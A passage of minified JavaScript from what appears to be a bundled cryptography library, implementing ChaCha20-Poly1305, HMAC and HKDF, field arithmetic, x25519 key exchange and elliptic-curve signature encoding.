q=0;q<s;q+=2)O=O+N|0,T=ne(T^O,16),P=P+T|0,N=ne(N^P,12),O=O+N|0,T=ne(T^O,8),P=P+T|0,N=ne(N^P,7),B=B+E|0,A=ne(A^B,16),y=y+A|0,E=ne(E^y,12),B=B+E|0,A=ne(A^B,8),y=y+A|0,E=ne(E^y,7),k=k+S|0,R=ne(R^k,16),m=m+R|0,S=ne(S^m,12),k=k+S|0,R=ne(R^k,8),m=m+R|0,S=ne(S^m,7),$=$+D|0,U=ne(U^$,16),I=I+U|0,D=ne(D^I,12),$=$+D|0,U=ne(U^$,8),I=I+U|0,D=ne(D^I,7),O=O+E|0,U=ne(U^O,16),m=m+U|0,E=ne(E^m,12),O=O+E|0,U=ne(U^O,8),m=m+U|0,E=ne(E^m,7),B=B+S|0,T=ne(T^B,16),I=I+T|0,S=ne(S^I,12),B=B+S|0,T=ne(T^B,8),I=I+T|0,S=ne(S^I,7),k=k+D|0,A=ne(A^k,16),P=P+A|0,D=ne(D^P,12),k=k+D|0,A=ne(A^k,8),P=P+A|0,D=ne(D^P,7),$=$+N|0,R=ne(R^$,16),y=y+R|0,N=ne(N^y,12),$=$+N|0,R=ne(R^$,8),y=y+R|0,N=ne(N^y,7);let M=0;r[M++]=o+O|0,r[M++]=a+B|0,r[M++]=c+k|0,r[M++]=l+$|0,r[M++]=u+N|0,r[M++]=h+E|0,r[M++]=f+S|0,r[M++]=p+D|0,r[M++]=d+P|0,r[M++]=g+y|0,r[M++]=w+m|0,r[M++]=_+I|0,r[M++]=C+T|0,r[M++]=v+A|0,r[M++]=b+R|0,r[M++]=x+U|0}const W_=F_(V_,{counterRight:!1,counterLength:4,allowShortKeys:!1}),K_=new Uint8Array(16),dh=(t,e)=>{t.update(e);const n=e.length%16;n&&t.update(K_.subarray(n))},H_=new Uint8Array(32);function ph(t,e,n,r,i){const s=t(e,n,H_),o=z_.create(s);i&&dh(o,i),dh(o,r);const a=T_(r.length,i?i.length:0,!0);o.update(a);const c=o.digest();return Nr(s,a),c}const G_=t=>(e,n,r)=>({encrypt(i,s){const o=i.length;s=uh(o+16,s,!1),s.set(i);const a=s.subarray(0,-16);t(e,n,a,a,1);const c=ph(t,e,n,a,r);return s.set(c,o),Nr(c),s},decrypt(i,s){s=uh(i.length-16,s,!1);const o=i.subarray(0,-16),a=i.subarray(-16),c=ph(t,e,n,o,r);if(!C_(a,c))throw new Error("invalid tag");return s.set(i.subarray(0,-16)),t(e,n,s,s,1),Nr(c),s}}),Kp=P_({blockSize:64,nonceLength:12,tagLength:16},G_(W_));let Hp=class extends Qs{constructor(e,n){super(),this.finished=!1,this.destroyed=!1,Js(e);const r=Ct(n);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const i=this.blockLen,s=new Uint8Array(i);s.set(r.length>i?e.create().update(r).digest():r);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),_t(s)}update(e){return Tn(this),this.iHash.update(e),this}digestInto(e){Tn(this),Pt(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:n,iHash:r,finished:i,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=i,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=n._cloneInto(e.oHash),e.iHash=r._cloneInto(e.iHash),e}clone(){return this._cloneInto()}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}};const no=(t,e,n)=>new Hp(t,e).update(n).digest();no.create=(t,e)=>new Hp(t,e);function Y_(t,e,n){return Js(t),n===void 0&&(n=new Uint8Array(t.outputLen)),no(t,Ct(n),Ct(e))}const Xo=Uint8Array.from([0]),gh=Uint8Array.of();function Z_(t,e,n,r=32){Js(t),ln(r);const i=t.outputLen;if(r>255*i)throw new Error("Length should be <= 255*HashLen");const s=Math.ceil(r/i);n===void 0&&(n=gh);const o=new Uint8Array(s*i),a=no.create(t,e),c=a._cloneInto(),l=new Uint8Array(a.outputLen);for(let u=0;u<s;u++)Xo[0]=u+1,c.update(u===0?gh:l).update(n).update(Xo).digestInto(l),o.set(l,i*u),a._cloneInto(c);return a.destroy(),c.destroy(),_t(l,Xo),o.slice(0,r)}const X_=(t,e,n,r,i)=>Z_(t,Y_(t,e,n),r,i),ro=eo,Kc=BigInt(0),Wa=BigInt(1);function Rs(t,e=""){if(typeof t!="boolean"){const n=e&&`"${e}"`;throw new Error(n+"expected boolean, got type="+typeof t)}return t}function Yn(t,e,n=""){const r=Xs(t),i=t?.length,s=e!==void 0;if(!r||s&&i!==e){const o=n&&`"${n}" `,a=s?` of length ${e}`:"",c=r?`length=${i}`:`type=${typeof t}`;throw new Error(o+"expected Uint8Array"+a+", got "+c)}return t}function ns(t){const e=t.toString(16);return e.length&1?"0"+e:e}function Gp(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?Kc:BigInt("0x"+t)}function io(t){return Gp(Pr(t))}function ks(t){return Pt(t),Gp(Pr(Uint8Array.from(t).reverse()))}function Hc(t,e){return Ts(t.toString(16).padStart(e*2,"0"))}function Gc(t,e){return Hc(t,e).reverse()}function Ve(t,e,n){let r;if(typeof e=="string")try{r=Ts(e)}catch(s){throw new Error(t+" must be hex string or Uint8Array, cause: "+s)}else if(Xs(e))r=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=r.length;if(typeof n=="number"&&i!==n)throw new Error(t+" of length "+n+" expected, got "+i);return r}const Jo=t=>typeof t=="bigint"&&Kc<=t;function J_(t,e,n){return Jo(t)&&Jo(e)&&Jo(n)&&e<=t&&t<n}function Ka(t,e,n,r){if(!J_(e,n,r))throw new Error("expected valid "+t+": "+n+" <= n < "+r+", got "+e)}function Yp(t){let e;for(e=0;t>Kc;t>>=Wa,e+=1);return e}const Mi=t=>(Wa<<BigInt(t))-Wa;function Q_(t,e,n){if(typeof t!="number"||t<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof n!="function")throw new Error("hmacFn must be a function");const r=f=>new Uint8Array(f),i=f=>Uint8Array.of(f);let s=r(t),o=r(t),a=0;const c=()=>{s.fill(1),o.fill(0),a=0},l=(...f)=>n(o,s,...f),u=(f=r(0))=>{o=l(i(0),f),s=l(),f.length!==0&&(o=l(i(1),f),s=l())},h=()=>{if(a++>=1e3)throw new Error("drbg: tried 1000 values");let f=0;const p=[];for(;f<e;){s=l();const d=s.slice();p.push(d),f+=s.length}return Dn(...p)};return(f,p)=>{c(),u(f);let d;for(;!(d=p(h()));)u();return c(),d}}function so(t,e,n={}){if(!t||typeof t!="object")throw new Error("expected valid options object");function r(i,s,o){const a=t[i];if(o&&a===void 0)return;const c=typeof a;if(c!==s||a===null)throw new Error(`param "${i}" is invalid: expected ${s}, got ${c}`)}Object.entries(e).forEach(([i,s])=>r(i,s,!1)),Object.entries(n).forEach(([i,s])=>r(i,s,!0))}function yh(t){const e=new WeakMap;return(n,...r)=>{const i=e.get(n);if(i!==void 0)return i;const s=t(n,...r);return e.set(n,s),s}}const it=BigInt(0),Ge=BigInt(1),Zn=BigInt(2),Zp=BigInt(3),Xp=BigInt(4),Jp=BigInt(5),eI=BigInt(7),Qp=BigInt(8),tI=BigInt(9),eg=BigInt(16);function ht(t,e){const n=t%e;return n>=it?n:e+n}function At(t,e,n){let r=t;for(;e-- >it;)r*=r,r%=n;return r}function mh(t,e){if(t===it)throw new Error("invert: expected non-zero number");if(e<=it)throw new Error("invert: expected positive modulus, got "+e);let n=ht(t,e),r=e,i=it,s=Ge;for(;n!==it;){const o=r/n,a=r%n,c=i-s*o;r=n,n=a,i=s,s=c}if(r!==Ge)throw new Error("invert: does not exist");return ht(i,e)}function Yc(t,e,n){if(!t.eql(t.sqr(e),n))throw new Error("Cannot find square root")}function tg(t,e){const n=(t.ORDER+Ge)/Xp,r=t.pow(e,n);return Yc(t,r,e),r}function nI(t,e){const n=(t.ORDER-Jp)/Qp,r=t.mul(e,Zn),i=t.pow(r,n),s=t.mul(e,i),o=t.mul(t.mul(s,Zn),i),a=t.mul(s,t.sub(o,t.ONE));return Yc(t,a,e),a}function rI(t){const e=Rn(t),n=ng(t),r=n(e,e.neg(e.ONE)),i=n(e,r),s=n(e,e.neg(r)),o=(t+eI)/eg;return(a,c)=>{let l=a.pow(c,o),u=a.mul(l,r);const h=a.mul(l,i),f=a.mul(l,s),p=a.eql(a.sqr(u),c),d=a.eql(a.sqr(h),c);l=a.cmov(l,u,p),u=a.cmov(f,h,d);const g=a.eql(a.sqr(u),c),w=a.cmov(l,u,g);return Yc(a,w,c),w}}function ng(t){if(t<Zp)throw new Error("sqrt is not defined for small field");let e=t-Ge,n=0;for(;e%Zn===it;)e/=Zn,n++;let r=Zn;const i=Rn(t);for(;wh(i,r)===1;)if(r++>1e3)throw new Error("Cannot find square root: probably non-prime P");if(n===1)return tg;let s=i.pow(r,e);const o=(e+Ge)/Zn;return function(a,c){if(a.is0(c))return c;if(wh(a,c)!==1)throw new Error("Cannot find square root");let l=n,u=a.mul(a.ONE,s),h=a.pow(c,e),f=a.pow(c,o);for(;!a.eql(h,a.ONE);){if(a.is0(h))return a.ZERO;let p=1,d=a.sqr(h);for(;!a.eql(d,a.ONE);)if(p++,d=a.sqr(d),p===l)throw new Error("Cannot find square root");const g=Ge<<BigInt(l-p-1),w=a.pow(u,g);l=p,u=a.sqr(w),h=a.mul(h,u),f=a.mul(f,w)}return f}}function iI(t){return t%Xp===Zp?tg:t%Qp===Jp?nI:t%eg===tI?rI(t):ng(t)}const sI=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function oI(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"number",BITS:"number"},n=sI.reduce((r,i)=>(r[i]="function",r),e);return so(t,n),t}function aI(t,e,n){if(n<it)throw new Error("invalid exponent, negatives unsupported");if(n===it)return t.ONE;if(n===Ge)return e;let r=t.ONE,i=e;for(;n>it;)n&Ge&&(r=t.mul(r,i)),i=t.sqr(i),n>>=Ge;return r}function rg(t,e,n=!1){const r=new Array(e.length).fill(n?t.ZERO:void 0),i=e.reduce((o,a,c)=>t.is0(a)?o:(r[c]=o,t.mul(o,a)),t.ONE),s=t.inv(i);return e.reduceRight((o,a,c)=>t.is0(a)?o:(r[c]=t.mul(o,r[c]),t.mul(o,a)),s),r}function wh(t,e){const n=(t.ORDER-Ge)/Zn,r=t.pow(e,n),i=t.eql(r,t.ONE),s=t.eql(r,t.ZERO),o=t.eql(r,t.neg(t.ONE));if(!i&&!s&&!o)throw new Error("invalid Legendre symbol result");return i?1:s?0:-1}function ig(t,e){e!==void 0&&ln(e);const n=e!==void 0?e:t.toString(2).length,r=Math.ceil(n/8);return{nBitLength:n,nByteLength:r}}function Rn(t,e,n=!1,r={}){if(t<=it)throw new Error("invalid field: expected ORDER > 0, got "+t);let i,s,o=!1,a;if(typeof e=="object"&&e!=null){if(r.sqrt||n)throw new Error("cannot specify opts in two arguments");const f=e;f.BITS&&(i=f.BITS),f.sqrt&&(s=f.sqrt),typeof f.isLE=="boolean"&&(n=f.isLE),typeof f.modFromBytes=="boolean"&&(o=f.modFromBytes),a=f.allowedLengths}else typeof e=="number"&&(i=e),r.sqrt&&(s=r.sqrt);const{nBitLength:c,nByteLength:l}=ig(t,i);if(l>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let u;const h=Object.freeze({ORDER:t,isLE:n,BITS:c,BYTES:l,MASK:Mi(c),ZERO:it,ONE:Ge,allowedLengths:a,create:f=>ht(f,t),isValid:f=>{if(typeof f!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof f);return it<=f&&f<t},is0:f=>f===it,isValidNot0:f=>!h.is0(f)&&h.isValid(f),isOdd:f=>(f&Ge)===Ge,neg:f=>ht(-f,t),eql:(f,p)=>f===p,sqr:f=>ht(f*f,t),add:(f,p)=>ht(f+p,t),sub:(f,p)=>ht(f-p,t),mul:(f,p)=>ht(f*p,t),pow:(f,p)=>aI(h,f,p),div:(f,p)=>ht(f*mh(p,t),t),sqrN:f=>f*f,addN:(f,p)=>f+p,subN:(f,p)=>f-p,mulN:(f,p)=>f*p,inv:f=>mh(f,t),sqrt:s||(f=>(u||(u=iI(t)),u(h,f))),toBytes:f=>n?Gc(f,l):Hc(f,l),fromBytes:(f,p=!0)=>{if(a){if(!a.includes(f.length)||f.length>l)throw new Error("Field.fromBytes: expected "+a+" bytes, got "+f.length);const g=new Uint8Array(l);g.set(f,n?0:g.length-f.length),f=g}if(f.length!==l)throw new Error("Field.fromBytes: expected "+l+" bytes, got "+f.length);let d=n?ks(f):io(f);if(o&&(d=ht(d,t)),!p&&!h.isValid(d))throw new Error("invalid field element: outside of range 0..ORDER");return d},invertBatch:f=>rg(h,f),cmov:(f,p,d)=>d?p:f});return Object.freeze(h)}function sg(t){if(typeof t!="bigint")throw new Error("field order must be bigint");const e=t.toString(2).length;return Math.ceil(e/8)}function og(t){const e=sg(t);return e+Math.ceil(e/2)}function cI(t,e,n=!1){const r=t.length,i=sg(e),s=og(e);if(r<16||r<s||r>1024)throw new Error("expected "+s+"-1024 bytes of input, got "+r);const o=n?ks(t):io(t),a=ht(o,e-Ge)+Ge;return n?Gc(a,i):Hc(a,i)}const Ur=BigInt(0),Xn=BigInt(1);function Ns(t,e){const n=e.negate();return t?n:e}function Qo(t,e){const n=rg(t.Fp,e.map(r=>r.Z));return e.map((r,i)=>t.fromAffine(r.toAffine(n[i])))}function ag(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function ea(t,e){ag(t,e);const n=Math.ceil(e/t)+1,r=2**(t-1),i=2**t,s=Mi(t),o=BigInt(t);return{windows:n,windowSize:r,mask:s,maxNumber:i,shiftBy:o}}function bh(t,e,n){const{windowSize:r,mask:i,maxNumber:s,shiftBy:o}=n;let a=Number(t&i),c=t>>o;a>r&&(a-=s,c+=Xn);const l=e*r,u=l+Math.abs(a)-1,h=a===0,f=a<0,p=e%2!==0;return{nextN:c,offset:u,isZero:h,isNeg:f,isNegF:p,offsetF:l}}function lI(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((n,r)=>{if(!(n instanceof e))throw new Error("invalid point at index "+r)})}function uI(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((n,r)=>{if(!e.isValid(n))throw new Error("invalid scalar at index "+r)})}const ta=new WeakMap,cg=new WeakMap;function na(t){return cg.get(t)||1}function vh(t){if(t!==Ur)throw new Error("invalid wNAF")}class hI{constructor(e,n){this.BASE=e.BASE,this.ZERO=e.ZERO,this.Fn=e.Fn,this.bits=n}_unsafeLadder(e,n,r=this.ZERO){let i=e;for(;n>Ur;)n&Xn&&(r=r.add(i)),i=i.double(),n>>=Xn;return r}precomputeWindow(e,n){const{windows:r,windowSize:i}=ea(n,this.bits),s=[];let o=e,a=o;for(let c=0;c<r;c++){a=o,s.push(a);for(let l=1;l<i;l++)a=a.add(o),s.push(a);o=a.double()}return s}wNAF(e,n,r){if(!this.Fn.isValid(r))throw new Error("invalid scalar");let i=this.ZERO,s=this.BASE;const o=ea(e,this.bits);for(let a=0;a<o.windows;a++){const{nextN:c,offset:l,isZero:u,isNeg:h,isNegF:f,offsetF:p}=bh(r,a,o);r=c,u?s=s.add(Ns(f,n[p])):i=i.add(Ns(h,n[l]))}return vh(r),{p:i,f:s}}wNAFUnsafe(e,n,r,i=this.ZERO){const s=ea(e,this.bits);for(let o=0;o<s.windows&&r!==Ur;o++){const{nextN:a,offset:c,isZero:l,isNeg:u}=bh(r,o,s);if(r=a,!l){const h=n[c];i=i.add(u?h.negate():h)}}return vh(r),i}getPrecomputes(e,n,r){let i=ta.get(n);return i||(i=this.precomputeWindow(n,e),e!==1&&(typeof r=="function"&&(i=r(i)),ta.set(n,i))),i}cached(e,n,r){const i=na(e);return this.wNAF(i,this.getPrecomputes(i,e,r),n)}unsafe(e,n,r,i){const s=na(e);return s===1?this._unsafeLadder(e,n,i):this.wNAFUnsafe(s,this.getPrecomputes(s,e,r),n,i)}createCache(e,n){ag(n,this.bits),cg.set(e,n),ta.delete(e)}hasCache(e){return na(e)!==1}}function fI(t,e,n,r){let i=e,s=t.ZERO,o=t.ZERO;for(;n>Ur||r>Ur;)n&Xn&&(s=s.add(i)),r&Xn&&(o=o.add(i)),i=i.double(),n>>=Xn,r>>=Xn;return{p1:s,p2:o}}function dI(t,e,n,r){lI(n,t),uI(r,e);const i=n.length,s=r.length;if(i!==s)throw new Error("arrays of points and scalars must have equal length");const o=t.ZERO,a=Yp(BigInt(i));let c=1;a>12?c=a-3:a>4?c=a-2:a>0&&(c=2);const l=Mi(c),u=new Array(Number(l)+1).fill(o),h=Math.floor((e.BITS-1)/c)*c;let f=o;for(let p=h;p>=0;p-=c){u.fill(o);for(let g=0;g<s;g++){const w=r[g],_=Number(w>>BigInt(p)&l);u[_]=u[_].add(n[g])}let d=o;for(let g=u.length-1,w=o;g>0;g--)w=w.add(u[g]),d=d.add(w);if(f=f.add(d),p!==0)for(let g=0;g<c;g++)f=f.double()}return f}function Eh(t,e,n){if(e){if(e.ORDER!==t)throw new Error("Field.ORDER must match order: Fp == p, Fn == n");return oI(e),e}else return Rn(t,{isLE:n})}function pI(t,e,n={},r){if(r===void 0&&(r=t==="edwards"),!e||typeof e!="object")throw new Error(`expected valid ${t} CURVE object`);for(const a of["p","n","h"]){const c=e[a];if(!(typeof c=="bigint"&&c>Ur))throw new Error(`CURVE.${a} must be positive bigint`)}const i=Eh(e.p,n.Fp,r),s=Eh(e.n,n.Fn,r),o=["Gx","Gy","a","b"];for(const a of o)if(!i.isValid(e[a]))throw new Error(`CURVE.${a} must be valid field element of CURVE.Fp`);return e=Object.freeze(Object.assign({},e)),{CURVE:e,Fp:i,Fn:s}}BigInt(0),BigInt(1),BigInt(2),BigInt(8),Pp("HashToScalar-");const ei=BigInt(0),vr=BigInt(1),rs=BigInt(2);function gI(t){return so(t,{adjustScalarBytes:"function",powPminus2:"function"}),Object.freeze({...t})}function yI(t){const e=gI(t),{P:n,type:r,adjustScalarBytes:i,powPminus2:s,randomBytes:o}=e,a=r==="x25519";if(!a&&r!=="x448")throw new Error("invalid type");const c=o||ur,l=a?255:448,u=a?32:56,h=BigInt(a?9:5),f=BigInt(a?121665:39081),p=a?rs**BigInt(254):rs**BigInt(447),d=a?BigInt(8)*rs**BigInt(251)-vr:BigInt(4)*rs**BigInt(445)-vr,g=p+d+vr,w=S=>ht(S,n),_=C(h);function C(S){return Gc(w(S),u)}function v(S){const D=Ve("u coordinate",S,u);return a&&(D[31]&=127),w(ks(D))}function b(S){return ks(i(Ve("scalar",S,u)))}function x(S,D){const P=k(v(D),b(S));if(P===ei)throw new Error("invalid private or public key received");return C(P)}function O(S){return x(S,_)}function B(S,D,P){const y=w(S*(D-P));return D=w(D-y),P=w(P+y),{x_2:D,x_3:P}}function k(S,D){Ka("u",S,ei,n),Ka("scalar",D,p,g);const P=D,y=S;let m=vr,I=ei,T=S,A=vr,R=ei;for(let M=BigInt(l-1);M>=ei;M--){const q=P>>M&vr;R^=q,{x_2:m,x_3:T}=B(R,m,T),{x_2:I,x_3:A}=B(R,I,A),R=q;const L=m+I,j=w(L*L),K=m-I,G=w(K*K),Z=j-G,H=T+A,Y=T-A,te=w(Y*L),ue=w(H*K),pe=te+ue,ye=te-ue;T=w(pe*pe),A=w(y*w(ye*ye)),m=w(j*G),I=w(Z*(j+w(f*Z)))}({x_2:m,x_3:T}=B(R,m,T)),{x_2:I,x_3:A}=B(R,I,A);const U=s(I);return w(m*U)}const $={secretKey:u,publicKey:u,seed:u},N=(S=c(u))=>(Pt(S,$.seed),S);function E(S){const D=N(S);return{secretKey:D,publicKey:O(D)}}return{keygen:E,getSharedSecret:(S,D)=>x(S,D),getPublicKey:S=>O(S),scalarMult:x,scalarMultBase:O,utils:{randomSecretKey:N,randomPrivateKey:N},GuBytes:_.slice(),lengths:$}}const mI=BigInt(1),xh=BigInt(2),wI=BigInt(3),bI=BigInt(5);BigInt(8);const lg=BigInt("0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffed"),vI={p:lg,n:BigInt("0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed"),a:BigInt("0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffec"),d:BigInt("0x52036cee2b6ffe738cc740797779e89800700a4d4141d8ab75eb4dca135978a3"),Gx:BigInt("0x216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51a"),Gy:BigInt("0x6666666666666666666666666666666666666666666666666666666666666658")};function EI(t){const e=BigInt(10),n=BigInt(20),r=BigInt(40),i=BigInt(80),s=lg,o=t*t%s*t%s,a=At(o,xh,s)*o%s,c=At(a,mI,s)*t%s,l=At(c,bI,s)*c%s,u=At(l,e,s)*l%s,h=At(u,n,s)*u%s,f=At(h,r,s)*h%s,p=At(f,i,s)*f%s,d=At(p,i,s)*f%s,g=At(d,e,s)*l%s;return{pow_p_5_8:At(g,xh,s)*t%s,b2:o}}function xI(t){return t[0]&=248,t[31]&=127,t[31]|=64,t}const _I=Rn(vI.p,{isLE:!0}),Ha=(()=>{const t=_I.ORDER;return yI({P:t,type:"x25519",powPminus2:e=>{const{pow_p_5_8:n,b2:r}=EI(e);return ht(At(n,wI,t)*r,t)},adjustScalarBytes:xI})})(),_h=(t,e)=>(t+(t>=0?e:-e)/ug)/e;function II(t,e,n){const[[r,i],[s,o]]=e,a=_h(o*t,n),c=_h(-i*t,n);let l=t-a*r-c*s,u=-a*i-c*o;const h=l<on,f=u<on;h&&(l=-l),f&&(u=-u);const p=Mi(Math.ceil(Yp(n)/2))+Tr;if(l<on||l>=p||u<on||u>=p)throw new Error("splitScalar (endomorphism): failed, k="+t);return{k1neg:h,k1:l,k2neg:f,k2:u}}function Ga(t){if(!["compact","recovered","der"].includes(t))throw new Error('Signature format must be "compact", "recovered", or "der"');return t}function ra(t,e){const n={};for(let r of Object.keys(e))n[r]=t[r]===void 0?e[r]:t[r];return Rs(n.lowS,"lowS"),Rs(n.prehash,"prehash"),n.format!==void 0&&Ga(n.format),n}class SI extends Error{constructor(e=""){super(e)}}const nn={Err:SI,_tlv:{encode:(t,e)=>{const{Err:n}=nn;if(t<0||t>256)throw new n("tlv.encode: wrong tag");if(e.length&1)throw new n("tlv.encode: unpadded data");const r=e.length/2,i=ns(r);if(i.length/2&128)throw new n("tlv.encode: long form length too big");const s=r>127?ns(i.length/2|128):"";return ns(t)+s+i+e},decode(t,e){const{Err:n}=nn;let r=0;if(t<0||t>256)throw new n("tlv.encode: wrong tag");if(e.length<2||e[r++]!==t)throw new n("tlv.decode: wrong tlv");const i=e[r++],s=!!(i&128);let o=0;if(!s)o=i;else{const c=i&127;if(!c)throw new n("tlv.decode(long): indefinite length not supported");if(c>4)throw new n("tlv.decode(long): byte length is too big");const l=e.subarray(r,r+c);if(l.length!==c)throw new n("tlv.decode: length bytes not complete");if(l[0]===0)throw new n("tlv.decode(long): zero leftmost byte");for(const u of l)o=o<<8|u;if(r+=c,o<128)throw new n("tlv.decode(long): not minimal encoding")}const a=e.subarray(r,r+o);if(a.length!==o)throw new n("tlv.decode: wrong value length");return{v:a,l:e.subarray(r+o)}}},_int:{encode(t){const{Err:e}=nn;if(t<on)throw new e("integer: negative integers are not allowed");let n=ns(t);if(Number.parseInt(n[0],16)&8&&(n="00"+n),n.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return n},decode(t){const{Err:e}=nn;if(t[0]&128)throw new e("invalid signature integer: negative");if(t[0]===0&&!(t[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return io(t)}},toSig(t){const{Err:e,_int:n,_tlv:r}=nn,i=Ve("signature",t),{v:s,l:o}=r.decode(48,i);if(o.length)throw new e("invalid signature: left bytes after parsing");const{v:a,l:c}=r.decode(2,s),{v:l,l:u}=r.decode(2,c);if(u.length)throw new e("invalid signature: left bytes after parsing");return{r:n.decode(a),s:n.decode(l)}},hexFromSig(t){const{_tlv:e,_int:n}=nn,r=e.encode(2,n.encode(t.r)),i=e.encode(2,n.encode(t.s)),s=r+i;return e.encode(48,s)}},on=BigInt(0),Tr=BigInt(1),ug=BigInt(2),is=BigInt(3),DI=BigInt(4);function Or(t,e){const{BYTES:n}=t;let r;if(typeof e=="bigint")r=e;else{let i=Ve("private key",e);try{r=t.fromBytes(i)}catch{throw new Error(`invalid private key: expected ui8a of size ${n}, got ${typeof e}`)}}if(!t.isValidNot0(r))throw new Error("invalid private key: out of range [1..N-1]");return r}function AI(t,e={}){const n=pI("weierstrass",t,e),{Fp:r,Fn:i}=n;let s=n.CURVE;const{h:o,n:a}=s;so(e,{},{allowInfinityPoint:"boolean",clearCofactor:"function",isTorsionFree:"function",fromBytes:"function",toBytes:"function",endo:"object",wrapPrivateKey:"boolean"});const{endo:c}=e;if(c&&(!r.is0(s.a)||typeof c.beta!="bigint"||!Array.isArray(c.basises)))throw new Error('invalid endo: expected "beta": bigint and "basises": array');const l=fg(r,i);function u(){if(!r.isOdd)throw new Error("compression is not supported: Field does not have .isOdd()")}function h(S,D,P){const{x:y,y:m}=D.toAffine(),I=r.toBytes(y);if(Rs(P,"isCompressed"),P){u();const T=!r.isOdd(m);return Dn(hg(T),I)}else return Dn(Uint8Array.of(4),I,r.toBytes(m))}function f(S){Yn(S,void 0,"Point");const{publicKey:D,publicKeyUncompressed:P}=l,y=S.length,m=S[0],I=S.subarray(1);if(y===D&&(m===2||m===3)){const T=r.fromBytes(I);if(!r.isValid(T))throw new Error("bad point: is not on curve, wrong x");const A=g(T);let R;try{R=r.sqrt(A)}catch(M){const q=M instanceof Error?": "+M.message:"";throw new Error("bad point: is not on curve, sqrt error"+q)}u();const U=r.isOdd(R);return(m&1)===1!==U&&(R=r.neg(R)),{x:T,y:R}}else if(y===P&&m===4){const T=r.BYTES,A=r.fromBytes(I.subarray(0,T)),R=r.fromBytes(I.subarray(T,T*2));if(!w(A,R))throw new Error("bad point: is not on curve");return{x:A,y:R}}else throw new Error(`bad point: got length ${y}, expected compressed=${D} or uncompressed=${P}`)}const p=e.toBytes||h,d=e.fromBytes||f;function g(S){const D=r.sqr(S),P=r.mul(D,S);return r.add(r.add(P,r.mul(S,s.a)),s.b)}function w(S,D){const P=r.sqr(D),y=g(S);return r.eql(P,y)}if(!w(s.Gx,s.Gy))throw new Error("bad curve params: generator point");const _=r.mul(r.pow(s.a,is),DI),C=r.mul(r.sqr(s.b),BigInt(27));if(r.is0(r.add(_,C)))throw new Error("bad curve params: a or b");function v(S,D,P=!1){if(!r.isValid(D)||P&&r.is0(D))throw new Error(`bad point coordinate ${S}`);return D}function b(S){if(!(S instanceof $))throw new Error("ProjectivePoint expected")}function x(S){if(!c||!c.basises)throw new Error("no endo");return II(S,c.basises,i.ORDER)}const O=yh((S,D)=>{const{X:P,Y:y,Z:m}=S;if(r.eql(m,r.ONE))return{x:P,y};const I=S.is0();D==null&&(D=I?r.ONE:r.inv(m));const T=r.mul(P,D),A=r.mul(y,D),R=r.mul(m,D);if(I)return{x:r.ZERO,y:r.ZERO};if(!r.eql(R,r.ONE))throw new Error("invZ was invalid");return{x:T,y:A}}),B=yh(S=>{if(S.is0()){if(e.allowInfinityPoint&&!r.is0(S.Y))return;throw new Error("bad point: ZERO")}const{x:D,y:P}=S.toAffine();if(!r.isValid(D)||!r.isValid(P))throw new Error("bad point: x or y not field elements");if(!w(D,P))throw new Error("bad point: equation left != right");if(!S.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});function k(S,D,P,y,m){return P=new $(r.mul(P.X,S),P.Y,P.Z),D=Ns(y,D),P=Ns(m,P),D.add(P)}class ${constructor(D,P,y){this.X=v("x",D),this.Y=v("y",P,!0),this.Z=v("z",y),Object.freeze(this)}static CURVE(){return s}static fromAffine(D){const{x:P,y}=D||{};if(!D||!r.isValid(P)||!r.isValid(y))throw new Error("invalid affine point");if(D instanceof $)throw new Error("projective point not allowed");return r.is0(P)&&r.is0(y)?$.ZERO:new $(P,y,r.ONE)}static fromBytes(D){const P=$.fromAffine(d(Yn(D,void 0,"point")));return P.assertValidity(),P}static fromHex(D){return $.fromBytes(Ve("pointHex",D))}get x(){return this.toAffine().x}get y(){return this.toAffine().y}precompute(D=8,P=!0){return E.createCache(this,D),P||this.multiply(is),this}assertValidity(){B(this)}hasEvenY(){const{y:D}=this.toAffine();if(!r.isOdd)throw new Error("Field doesn't support isOdd");return!r.isOdd(D)}equals(D){b(D);const{X:P,Y:y,Z:m}=this,{X:I,Y:T,Z:A}=D,R=r.eql(r.mul(P,A),r.mul(I,m)),U=r.eql(r.mul(y,A),r.mul(T,m));return R&&U}negate(){return new $(this.X,r.neg(this.Y),this.Z)}double(){const{a:D,b:P}=s,y=r.mul(P,is),{X:m,Y:I,Z:T}=this;let A=r.ZERO,R=r.ZERO,U=r.ZERO,M=r.mul(m,m),q=r.mul(I,I),L=r.mul(T,T),j=r.mul(m,I);return 